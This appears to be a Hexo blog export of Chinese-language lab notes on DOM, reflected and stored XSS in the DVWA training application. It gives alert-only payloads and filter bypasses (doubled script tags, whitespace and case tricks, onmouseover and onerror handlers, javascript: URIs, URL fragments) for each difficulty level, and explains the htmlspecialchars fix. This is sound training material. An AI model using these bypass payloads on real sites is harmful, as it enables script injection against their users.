src=\"/img/xss/dvwa/Dom/medium_002.png\" alt=\"008\"></p>\n<ol start=\"2\">\n<li><p>使用javascript协议</p>\n<p><img src=\"/img/xss/dvwa/Dom/medium_003.png\" alt=\"009\"></p>\n</li>\n</ol>\n<p><img src=\"/img/xss/dvwa/Dom/medium_004.png\" alt=\"010\"></p>\n<h2 id=\"HIGH\"><a href=\"#HIGH\" class=\"headerlink\" title=\"HIGH\"></a>HIGH</h2><h3 id=\"Source-2\"><a href=\"#Source-2\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Dom/high_001.png\" alt=\"011\"></p>\n<h3 id=\"Analysis-2\"><a href=\"#Analysis-2\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">类似于白名单过滤,看似无懈可击,但是可以利用<span class=\"built_in\">URL</span>的一个特性。</span><br><span class=\"line\"><span class=\"built_in\">URL</span>的部分发往服务器时<span class=\"comment\">#号后面的并不会发送到服务器，但是javascript代码</span></span><br><span class=\"line\">还会正常读取，所以利用这个特性来绕过服务器端的检查。</span><br></pre></td></tr></table></figure>\n\n<p>1.<code>http://192.168.1.111/DVWA/vulnerabilities/xss_d/?default=#&lt;/select&gt;&lt;a href=# onmouseover=alert(&#39;事件&#39;)&gt;ClickHere&lt;/a&gt;&lt;select name=&quot;fuck&quot;&gt;</code></p>\n<h3 id=\"Process-2\"><a href=\"#Process-2\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><p><img src=\"/img/xss/dvwa/Dom/high_002.png\" alt=\"012\"></p>\n<p><img src=\"/img/xss/dvwa/Dom/high_003.png\" alt=\"013\"></p>\n<h2 id=\"IMPOSSIBLE\"><a href=\"#IMPOSSIBLE\" class=\"headerlink\" title=\"IMPOSSIBLE\"></a>IMPOSSIBLE</h2><h3 id=\"Source-3\"><a href=\"#Source-3\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Dom/impossible_01.png\" alt=\"014\"></p>\n<p>提示已经用客户端侧进行保护了,无法再进行修改。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"DVWA-XSS‘DOM型’手记\"><a href=\"#DVWA-XSS‘DOM型’手记\" class=\"headerlink\" title=\"DVWA-XSS‘DOM型’手记\"></a>DVWA-XSS‘DOM型’手记</h1><hr>\n<p>可能触发DOM型XSS的属性：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">document</span><span class=\"selector-class\">.referer</span>属性</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"selector-tag\">window</span><span class=\"selector-class\">.name</span>属性</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"selector-tag\">location</span>属性</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"selector-tag\">innerHTML</span>属性</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"selector-tag\">documen</span><span class=\"selector-class\">.write</span>属性</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"LOW\"><a href=\"#LOW\" class=\"headerlink\" title=\"LOW\"></a>LOW</h2><h3 id=\"Source\"><a href=\"#Source\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Dom/low_001.png\" alt=\"001\"></p>\n<h3 id=\"Analysis\"><a href=\"#Analysis\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><figure class=\"highlight delphi\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">没有进行任何过滤,利用F12开发者模式寻找到DOM位置。找到<span class=\"keyword\">name</span>属性为<span class=\"keyword\">default</span>,通过在url中的<span class=\"keyword\">default</span>参数来修改页面。</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/dvwa/Dom/low_002.png\" alt=\"002\"></p>\n<p>这里可以直接弹窗。</p>\n<figure class=\"highlight xquery\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>.http://<span class=\"number\">10.60</span>.<span class=\"number\">250.3</span>/dvwa/vulnerabilities/xss_d/?<span class=\"keyword\">default</span>=<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\">alert(1)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/dvwa/Dom/low_003.png\" alt=\"003\"></p>\n<p>可以发现结构已经被破坏了。</p>\n<p><img src=\"/img/xss/dvwa/Dom/low_004.png\" alt=\"004\"></p>\n<p>同样可以构造闭合将页面破坏成想要的样子。</p>\n<p>2.<code>http://10.60.250.3/dvwa/vulnerabilities/xss_d/?default=&lt;/select&gt;&lt;a href=# onmouseover=alert(&#39;事件&#39;)&gt;ClickHere&lt;/a&gt;&lt;select name=&quot;fuck&quot;&gt;</code></p>\n<h3 id=\"Process\"><a href=\"#Process\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><p><img src=\"/img/xss/dvwa/Dom/low_005.png\" alt=\"005\"></p>\n<p><img src=\"/img/xss/dvwa/Dom/low_006.png\" alt=\"006\"></p>\n<h2 id=\"MEDIUM\"><a href=\"#MEDIUM\" class=\"headerlink\" title=\"MEDIUM\"></a>MEDIUM</h2><h3 id=\"Source-1\"><a href=\"#Source-1\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Dom/medium_001.png\" alt=\"007\"></p>\n<h3 id=\"Analysis-1\"><a href=\"#Analysis-1\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查找是否存在&lt;<span class=\"keyword\">script</span>,stripos能检验大小写的,发现恶意构造的就默认使用English。</span><br><span class=\"line\">既然这样就不使用&lt;<span class=\"keyword\">script</span>即可。</span><br></pre></td></tr></table></figure>\n\n<pre><code>1. 使用事件\n  `http://10.60.250.250/DVWA/vulnerabilities/xss_d/?default=&lt;/select&gt;&lt;a href=# onmouseover=alert(&apos;事件&apos;)&gt;ClickHere&lt;/a&gt;&lt;select name=&quot;fuck&quot;&gt;`\n2. 使用javascript协议\n `http://10.60.250.3/dvwa/vulnerabilities/xss_d/?default=&lt;/select&gt;&lt;a href=&quot;javascript:alert(&apos;javascript&apos;)&quot;&gt;Clickme&lt;/a&gt;&lt;select name=&quot;fuck&quot;&gt;`</code></pre><h3 id=\"Process-1\"><a href=\"#Process-1\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><ol>\n<li>使用事件</li>\n</ol>\n<p><img src=\"/img/xss/dvwa/Dom/medium_002.png\" alt=\"008\"></p>\n<ol start=\"2\">\n<li><p>使用javascript协议</p>\n<p><img src=\"/img/xss/dvwa/Dom/medium_003.png\" alt=\"009\"></p>\n</li>\n</ol>\n<p><img src=\"/img/xss/dvwa/Dom/medium_004.png\" alt=\"010\"></p>\n<h2 id=\"HIGH\"><a href=\"#HIGH\" class=\"headerlink\" title=\"HIGH\"></a>HIGH</h2><h3 id=\"Source-2\"><a href=\"#Source-2\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Dom/high_001.png\" alt=\"011\"></p>\n<h3 id=\"Analysis-2\"><a href=\"#Analysis-2\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">类似于白名单过滤,看似无懈可击,但是可以利用<span class=\"built_in\">URL</span>的一个特性。</span><br><span class=\"line\"><span class=\"built_in\">URL</span>的部分发往服务器时<span class=\"comment\">#号后面的并不会发送到服务器，但是javascript代码</span></span><br><span class=\"line\">还会正常读取，所以利用这个特性来绕过服务器端的检查。</span><br></pre></td></tr></table></figure>\n\n<p>1.<code>http://192.168.1.111/DVWA/vulnerabilities/xss_d/?default=#&lt;/select&gt;&lt;a href=# onmouseover=alert(&#39;事件&#39;)&gt;ClickHere&lt;/a&gt;&lt;select name=&quot;fuck&quot;&gt;</code></p>\n<h3 id=\"Process-2\"><a href=\"#Process-2\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><p><img src=\"/img/xss/dvwa/Dom/high_002.png\" alt=\"012\"></p>\n<p><img src=\"/img/xss/dvwa/Dom/high_003.png\" alt=\"013\"></p>\n<h2 id=\"IMPOSSIBLE\"><a href=\"#IMPOSSIBLE\" class=\"headerlink\" title=\"IMPOSSIBLE\"></a>IMPOSSIBLE</h2><h3 id=\"Source-3\"><a href=\"#Source-3\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Dom/impossible_01.png\" alt=\"014\"></p>\n<p>提示已经用客户端侧进行保护了,无法再进行修改。</p>\n"},{"title":"DVWA-xss‘反射型’手记","date":"2018-10-10T07:22:58.000Z","_content":"\n# DVWA-XSS‘反射型’手记\n\n---\n\n## LOW\n\n### Source:\n\n![001](/img/xss/dvwa/Reflected/low_001.png)\n\n### Analysis:\t\n\n\t没有进行任何过滤,直接用弹窗测试漏洞存在。\n\n### Process:\n\n![002](/img/xss/dvwa/Reflected/low_002.png)\n\n![003](/img/xss/dvwa/Reflected/low_003.png)\n\n## MEDIUM\n\n### Source:\n\n![004](/img/xss/dvwa/Reflected/medium_001.png)\n\n### Analysis:\t\n\n\t对script替换成空。可以采用多种方法绕过。\n\t1. 双写\n\t\t<sc<script>ript>alert('双写')</script>\n\t2. 添加空格或换行\n\t\t添加空格\n\t\t<script >alert('添加空格')</script>\n\t\t\n\t\t添加换行\n\t\t<script \n\t\t>alert('添加换行')</script>\n\t 3. 替换大小写\n\t \t<Script>alert('修改S')</script>\n\n### Process:\n\n1. 双写\n\n![005](/img/xss/dvwa/Reflected/medium_t001.png)\n\n2. 添加空格\n\n![006](/img/xss/dvwa/Reflected/medium_t002.png)\n\n​       \t\t添加换行\n\n![007](/img/xss/dvwa/Reflected/medium_t002_1.png)\n\n3. 替换大小写\n\n   ![008](/img/xss/dvwa/Reflected/medium_t003.png)\n\n\n\n## HIGH\n\n### Source:\n\n![009](/img/xss/dvwa/Reflected/high_001.png)\n\n### Analysis:\t\n\n```\n过滤了<script,检查了大小写。就算是<s1c2r3i4p5t也全替为空。\n对于这种情况不使用script就行了。\n1.事件触发执行javascript\n\t<a href=# onmouseover=alert('事件')>ClickHere</a>\n2.Src属性\n\t<img src=x onerror=alert('Src属性');>\n```\n\n### Process:\n\n1.事件触发执行javascript\n\n![010](/img/xss/dvwa/Reflected/high_002.png)\n\n2.Src属性\n\n![011](/img/xss/dvwa/Reflected/high_003.png)\n\n## IMPOSSIBLE\n\n### Source:\n\n![012](/img/xss/dvwa/Reflected/impossible_001.png)\n\n### Analysis:\t\n\n\n    htmlspecialchars 将特殊字符转换为 HTML 实体\n    & (& 符号)\t&amp;\n    \" (双引号)\t&quot;，除非设置了 ENT_NOQUOTES\n    ' (单引号)\t&#039; \n    < (小于)\t&lt;\n    > (大于)\t&gt;\n    \n    可以看到，Impossible等级的代码使用htmlspecialchars函数把预定义的字符转换为HTML实体，\n    防止浏览器将其作为HTML元素。从而防治了反射型XSS利用和危害。\n\n\n\n\n\n\n","source":"_posts/DVWA-XSS‘反射型’手记.md","raw":"---\ntitle: DVWA-xss‘反射型’手记\ndate: 2018-10-10 15:22:58\ntags: [DVWA,XSS]\ncategories: XSS\n---\n\n# DVWA-XSS‘反射型’手记\n\n---\n\n## LOW\n\n### Source:\n\n![001](/img/xss/dvwa/Reflected/low_001.png)\n\n### Analysis:\t\n\n\t没有进行任何过滤,直接用弹窗测试漏洞存在。\n\n### Process:\n\n![002](/img/xss/dvwa/Reflected/low_002.png)\n\n![003](/img/xss/dvwa/Reflected/low_003.png)\n\n## MEDIUM\n\n### Source:\n\n![004](/img/xss/dvwa/Reflected/medium_001.png)\n\n### Analysis:\t\n\n\t对script替换成空。可以采用多种方法绕过。\n\t1. 双写\n\t\t<sc<script>ript>alert('双写')</script>\n\t2. 添加空格或换行\n\t\t添加空格\n\t\t<script >alert('添加空格')</script>\n\t\t\n\t\t添加换行\n\t\t<script \n\t\t>alert('添加换行')</script>\n\t 3. 替换大小写\n\t \t<Script>alert('修改S')</script>\n\n### Process:\n\n1. 双写\n\n![005](/img/xss/dvwa/Reflected/medium_t001.png)\n\n2. 添加空格\n\n![006](/img/xss/dvwa/Reflected/medium_t002.png)\n\n​       \t\t添加换行\n\n![007](/img/xss/dvwa/Reflected/medium_t002_1.png)\n\n3. 替换大小写\n\n   ![008](/img/xss/dvwa/Reflected/medium_t003.png)\n\n\n\n## HIGH\n\n### Source:\n\n![009](/img/xss/dvwa/Reflected/high_001.png)\n\n### Analysis:\t\n\n```\n过滤了<script,检查了大小写。就算是<s1c2r3i4p5t也全替为空。\n对于这种情况不使用script就行了。\n1.事件触发执行javascript\n\t<a href=# onmouseover=alert('事件')>ClickHere</a>\n2.Src属性\n\t<img src=x onerror=alert('Src属性');>\n```\n\n### Process:\n\n1.事件触发执行javascript\n\n![010](/img/xss/dvwa/Reflected/high_002.png)\n\n2.Src属性\n\n![011](/img/xss/dvwa/Reflected/high_003.png)\n\n## IMPOSSIBLE\n\n### Source:\n\n![012](/img/xss/dvwa/Reflected/impossible_001.png)\n\n### Analysis:\t\n\n\n    htmlspecialchars 将特殊字符转换为 HTML 实体\n    & (& 符号)\t&amp;\n    \" (双引号)\t&quot;，除非设置了 ENT_NOQUOTES\n    ' (单引号)\t&#039; \n    < (小于)\t&lt;\n    > (大于)\t&gt;\n    \n    可以看到，Impossible等级的代码使用htmlspecialchars函数把预定义的字符转换为HTML实体，\n    防止浏览器将其作为HTML元素。从而防治了反射型XSS利用和危害。\n\n\n\n\n\n\n","slug":"DVWA-XSS‘反射型’手记","published":1,"updated":"2019-06-19T17:23:13.380Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istbj000a4dsbyjvfhpra","content":"<h1 id=\"DVWA-XSS‘反射型’手记\"><a href=\"#DVWA-XSS‘反射型’手记\" class=\"headerlink\" title=\"DVWA-XSS‘反射型’手记\"></a>DVWA-XSS‘反射型’手记</h1><hr>\n<h2 id=\"LOW\"><a href=\"#LOW\" class=\"headerlink\" title=\"LOW\"></a>LOW</h2><h3 id=\"Source\"><a href=\"#Source\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Reflected/low_001.png\" alt=\"001\"></p>\n<h3 id=\"Analysis\"><a href=\"#Analysis\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><pre><code>没有进行任何过滤,直接用弹窗测试漏洞存在。</code></pre><h3 id=\"Process\"><a href=\"#Process\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><p><img src=\"/img/xss/dvwa/Reflected/low_002.png\" alt=\"002\"></p>\n<p><img src=\"/img/xss/dvwa/Reflected/low_003.png\" alt=\"003\"></p>\n<h2 id=\"MEDIUM\"><a href=\"#MEDIUM\" class=\"headerlink\" title=\"MEDIUM\"></a>MEDIUM</h2><h3 id=\"Source-1\"><a href=\"#Source-1\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Reflected/medium_001.png\" alt=\"004\"></p>\n<h3 id=\"Analysis-1\"><a href=\"#Analysis-1\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><pre><code>对script替换成空。可以采用多种方法绕过。\n1. 双写\n    &lt;sc&lt;script&gt;ript&gt;alert(&apos;双写&apos;)&lt;/script&gt;\n2. 添加空格或换行\n    添加空格\n    &lt;script &gt;alert(&apos;添加空格&apos;)&lt;/script&gt;\n\n    添加换行\n    &lt;script \n    &gt;alert(&apos;添加换行&apos;)&lt;/script&gt;\n 3. 替换大小写\n     &lt;Script&gt;alert(&apos;修改S&apos;)&lt;/script&gt;</code></pre><h3 id=\"Process-1\"><a href=\"#Process-1\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><ol>\n<li>双写</li>\n</ol>\n<p><img src=\"/img/xss/dvwa/Reflected/medium_t001.png\" alt=\"005\"></p>\n<ol start=\"2\">\n<li>添加空格</li>\n</ol>\n<p><img src=\"/img/xss/dvwa/Reflected/medium_t002.png\" alt=\"006\"></p>\n<p>​               添加换行</p>\n<p><img src=\"/img/xss/dvwa/Reflected/medium_t002_1.png\" alt=\"007\"></p>\n<ol start=\"3\">\n<li><p>替换大小写</p>\n<p><img src=\"/img/xss/dvwa/Reflected/medium_t003.png\" alt=\"008\"></p>\n</li>\n</ol>\n<h2 id=\"HIGH\"><a href=\"#HIGH\" class=\"headerlink\" title=\"HIGH\"></a>HIGH</h2><h3 id=\"Source-2\"><a href=\"#Source-2\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Reflected/high_001.png\" alt=\"009\"></p>\n<h3 id=\"Analysis-2\"><a href=\"#Analysis-2\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤了&lt;script,检查了大小写。就算是&lt;s1c2r3i4p5t也全替为空。</span><br><span class=\"line\">对于这种情况不使用script就行了。</span><br><span class=\"line\">1.事件触发执行javascript</span><br><span class=\"line\">\t&lt;a <span class=\"attribute\">href</span>=# <span class=\"attribute\">onmouseover</span>=alert('事件')&gt;ClickHere&lt;/a&gt;</span><br><span class=\"line\">2.Src属性</span><br><span class=\"line\">\t&lt;img <span class=\"attribute\">src</span>=x <span class=\"attribute\">onerror</span>=alert('Src属性');&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Process-2\"><a href=\"#Process-2\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><p>1.事件触发执行javascript</p>\n<p><img src=\"/img/xss/dvwa/Reflected/high_002.png\" alt=\"010\"></p>\n<p>2.Src属性</p>\n<p><img src=\"/img/xss/dvwa/Reflected/high_003.png\" alt=\"011\"></p>\n<h2 id=\"IMPOSSIBLE\"><a href=\"#IMPOSSIBLE\" class=\"headerlink\" title=\"IMPOSSIBLE\"></a>IMPOSSIBLE</h2><h3 id=\"Source-3\"><a href=\"#Source-3\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Reflected/impossible_001.png\" alt=\"012\"></p>\n<h3 id=\"Analysis-3\"><a href=\"#Analysis-3\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><pre><code>htmlspecialchars 将特殊字符转换为 HTML 实体\n&amp; (&amp; 符号)    &amp;amp;\n&quot; (双引号)    &amp;quot;，除非设置了 ENT_NOQUOTES\n&apos; (单引号)    &amp;#039; \n&lt; (小于)    &amp;lt;\n&gt; (大于)    &amp;gt;\n\n可以看到，Impossible等级的代码使用htmlspecialchars函数把预定义的字符转换为HTML实体，\n防止浏览器将其作为HTML元素。从而防治了反射型XSS利用和危害。</code></pre>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"DVWA-XSS‘反射型’手记\"><a href=\"#DVWA-XSS‘反射型’手记\" class=\"headerlink\" title=\"DVWA-XSS‘反射型’手记\"></a>DVWA-XSS‘反射型’手记</h1><hr>\n<h2 id=\"LOW\"><a href=\"#LOW\" class=\"headerlink\" title=\"LOW\"></a>LOW</h2><h3 id=\"Source\"><a href=\"#Source\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Reflected/low_001.png\" alt=\"001\"></p>\n<h3 id=\"Analysis\"><a href=\"#Analysis\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><pre><code>没有进行任何过滤,直接用弹窗测试漏洞存在。</code></pre><h3 id=\"Process\"><a href=\"#Process\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><p><img src=\"/img/xss/dvwa/Reflected/low_002.png\" alt=\"002\"></p>\n<p><img src=\"/img/xss/dvwa/Reflected/low_003.png\" alt=\"003\"></p>\n<h2 id=\"MEDIUM\"><a href=\"#MEDIUM\" class=\"headerlink\" title=\"MEDIUM\"></a>MEDIUM</h2><h3 id=\"Source-1\"><a href=\"#Source-1\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Reflected/medium_001.png\" alt=\"004\"></p>\n<h3 id=\"Analysis-1\"><a href=\"#Analysis-1\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><pre><code>对script替换成空。可以采用多种方法绕过。\n1. 双写\n    &lt;sc&lt;script&gt;ript&gt;alert(&apos;双写&apos;)&lt;/script&gt;\n2. 添加空格或换行\n    添加空格\n    &lt;script &gt;alert(&apos;添加空格&apos;)&lt;/script&gt;\n\n    添加换行\n    &lt;script \n    &gt;alert(&apos;添加换行&apos;)&lt;/script&gt;\n 3. 替换大小写\n     &lt;Script&gt;alert(&apos;修改S&apos;)&lt;/script&gt;</code></pre><h3 id=\"Process-1\"><a href=\"#Process-1\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><ol>\n<li>双写</li>\n</ol>\n<p><img src=\"/img/xss/dvwa/Reflected/medium_t001.png\" alt=\"005\"></p>\n<ol start=\"2\">\n<li>添加空格</li>\n</ol>\n<p><img src=\"/img/xss/dvwa/Reflected/medium_t002.png\" alt=\"006\"></p>\n<p>​               添加换行</p>\n<p><img src=\"/img/xss/dvwa/Reflected/medium_t002_1.png\" alt=\"007\"></p>\n<ol start=\"3\">\n<li><p>替换大小写</p>\n<p><img src=\"/img/xss/dvwa/Reflected/medium_t003.png\" alt=\"008\"></p>\n</li>\n</ol>\n<h2 id=\"HIGH\"><a href=\"#HIGH\" class=\"headerlink\" title=\"HIGH\"></a>HIGH</h2><h3 id=\"Source-2\"><a href=\"#Source-2\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Reflected/high_001.png\" alt=\"009\"></p>\n<h3 id=\"Analysis-2\"><a href=\"#Analysis-2\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤了&lt;script,检查了大小写。就算是&lt;s1c2r3i4p5t也全替为空。</span><br><span class=\"line\">对于这种情况不使用script就行了。</span><br><span class=\"line\">1.事件触发执行javascript</span><br><span class=\"line\">\t&lt;a <span class=\"attribute\">href</span>=# <span class=\"attribute\">onmouseover</span>=alert('事件')&gt;ClickHere&lt;/a&gt;</span><br><span class=\"line\">2.Src属性</span><br><span class=\"line\">\t&lt;img <span class=\"attribute\">src</span>=x <span class=\"attribute\">onerror</span>=alert('Src属性');&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Process-2\"><a href=\"#Process-2\" class=\"headerlink\" title=\"Process:\"></a>Process:</h3><p>1.事件触发执行javascript</p>\n<p><img src=\"/img/xss/dvwa/Reflected/high_002.png\" alt=\"010\"></p>\n<p>2.Src属性</p>\n<p><img src=\"/img/xss/dvwa/Reflected/high_003.png\" alt=\"011\"></p>\n<h2 id=\"IMPOSSIBLE\"><a href=\"#IMPOSSIBLE\" class=\"headerlink\" title=\"IMPOSSIBLE\"></a>IMPOSSIBLE</h2><h3 id=\"Source-3\"><a href=\"#Source-3\" class=\"headerlink\" title=\"Source:\"></a>Source:</h3><p><img src=\"/img/xss/dvwa/Reflected/impossible_001.png\" alt=\"012\"></p>\n<h3 id=\"Analysis-3\"><a href=\"#Analysis-3\" class=\"headerlink\" title=\"Analysis:\"></a>Analysis:</h3><pre><code>htmlspecialchars 将特殊字符转换为 HTML 实体\n&amp; (&amp; 符号)    &amp;amp;\n&quot; (双引号)    &amp;quot;，除非设置了 ENT_NOQUOTES\n&apos; (单引号)    &amp;#039; \n&lt; (小于)    &amp;lt;\n&gt; (大于)    &amp;gt;\n\n可以看到，Impossible等级的代码使用htmlspecialchars函数把预定义的字符转换为HTML实体，\n防止浏览器将其作为HTML元素。从而防治了反射型XSS利用和危害。</code></pre>"},{"title":"DVWA-XSS‘存储型’手记","date":"2018-10-10T08:43:26.000Z","_content":"\n# DVWA-XSS‘存储型’手记\n\n---\n\n## LOW\n\n### Source:\n\n![001](/img/xss/dvwa/Stored/low_001.png)\n\n### Analysis:\t\n\n先对用户名和消息去除了两边的空格。将消息在输入时转义下存储进数据库。但是二次读取后没有检查,这里Name和Message都可以注入。直接用`<script>alert(1)</script>`弹窗测试。\n\n在前端有对name有长度限制,可以F12开发者模式定位到进行修改。修改maxlength=\"100\"后可以对name进行xss注入了。\n\n![002](/img/xss/dvwa/Stored/low_002.png)\n\n![003](/img/xss/dvwa/Stored/low_003.png)\n\n```\n<a href=# onmouseover=alert('Name')>ClickHere</a>\n<a href=# onmouseover=alert('Message')>ClickHere</a>\n```\n\n### Process:\n\n![004](/img/xss/dvwa/Stored/low_004.png)\n\n## MEDIUM\n\n### Source:\n\n![005](/img/xss/dvwa/Stored/medium_001.png)\n\n### Analysis:\t\n\n```\n利用trim函数清除$message和$name 两端空格。\n$message用strip_tags函数从字符串中去除 HTML 和 PHP 标记。后再用htmlspecialchars进行转义。把$message的路堵死了。\n将$name中的<script>替换为空。\n\n对script替换成空。可以采用多种方法绕过。\n1. 双写\n\t<sc<script>ript>alert('双写')</script>\n2. 添加空格或换行\n\t添加空格\n\t<script >alert('添加空格')</script>\n\t\n\t添加换行\n\t<script \n\t>alert('添加换行')</script>\n 3. 替换大小写\n \t<Script>alert('修改S')</script>\n \t\n 先在前端修改对name的输入框属性maxlength=\"100\"，再进行xss注入。\n 也可以像下面的payload一样不使用<script>\n payload：\n <a href=# onmouseover=alert('Name')>ClickHere</a>\n```\n\n### Process:\n\n1. 双写\n\n![006](/img/xss/dvwa/Stored/medium_002.png)\n\n2. 添加空格\n\n![007](/img/xss/dvwa/Stored/medium_003.png)\n\n​       \t\t添加换行\n\n![008](/img/xss/dvwa/Stored/medium_004.png)\n\n3. 替换大小写\n\n   ![009](/img/xss/dvwa/Stored/medium_005.png)\n\n4. 不使用`<script>`\n\n![010](/img/xss/dvwa/Stored/medium_006.png)\n\n## HIGH\n\n### Source:\n\n![011](/img/xss/dvwa/Stored/high_001.png)\n\n### Analysis:\t\n\n```\n过滤了<script,检查了大小写。\n对于这种情况不使用script就行了。\n1.事件触发执行javascript\n\t<a href=# onmouseover=alert('事件')>ClickHere</a>\n2.Src属性\n\t<img src=x onerror=alert('Src属性');>\n照例先进行前端绕过Name的长度限制。\n```\n\n### Process:\n\n1.事件触发执行javascript\n\n![012](/img/xss/dvwa/Stored/high_002.png)\n\n2.Src属性\n\n![013](/img/xss/dvwa/Stored/high_003.png)\n\n## IMPOSSIBLE\n\n### Source:\n\n![014](/img/xss/dvwa/Stored/impossible_001.png)\n\n### Analysis:\t\n\n```\nhtmlspecialchars 将特殊字符转换为 HTML 实体\n& (& 符号)\t&amp;\n\" (双引号)\t&quot;，除非设置了 ENT_NOQUOTES\n' (单引号)\t&#039; \n< (小于)\t&lt;\n> (大于)\t&gt;\n\nImpossible等级的代码使用htmlspecialchars函数把预定义的字符转换为HTML实体，\n防止浏览器将其作为HTML元素。从而防治了XSS利用和危害。\n```\n\n\n\n\n\n","source":"_posts/DVWA-XSS‘存储型’手记.md","raw":"---\ntitle: DVWA-XSS‘存储型’手记\ndate: 2018-10-10 16:43:26\ntags: [DVWA,XSS]\ncategories: XSS\n---\n\n# DVWA-XSS‘存储型’手记\n\n---\n\n## LOW\n\n### Source:\n\n![001](/img/xss/dvwa/Stored/low_001.png)\n\n### Analysis:\t\n\n先对用户名和消息去除了两边的空格。将消息在输入时转义下存储进数据库。但是二次读取后没有检查,这里Name和Message都可以注入。直接用`<script>alert(1)</script>`弹窗测试。\n\n在前端有对name有长度限制,可以F12开发者模式定位到进行修改。修改maxlength=\"100\"后可以对name进行xss注入了。\n\n![002](/img/xss/dvwa/Stored/low_002.png)\n\n![003](/img/xss/dvwa/Stored/low_003.png)\n\n```\n<a href=# onmouseover=alert('Name')>ClickHere</a>\n<a href=# onmouseover=alert('Message')>ClickHere</a>\n```\n\n### Process:\n\n![004](/img/xss/dvwa/Stored/low_004.png)\n\n## MEDIUM\n\n### Source:\n\n![005](/img/xss/dvwa/Stored/medium_001.png)\n\n### Analysis:\t\n\n```\n利用trim函数清除$message和$name 两端空格。\n$message用strip_tags函数从字符串中去除 HTML 和 PHP 标记。后再用htmlspecialchars进行转义。把$message的路堵死了。\n将$name中的<script>替换为空。\n\n对script替换成空。可以采用多种方法绕过。\n1. 双写\n\t<sc<script>ript>alert('双写')</script>\n2. 添加空格或换行\n\t添加空格\n\t<script 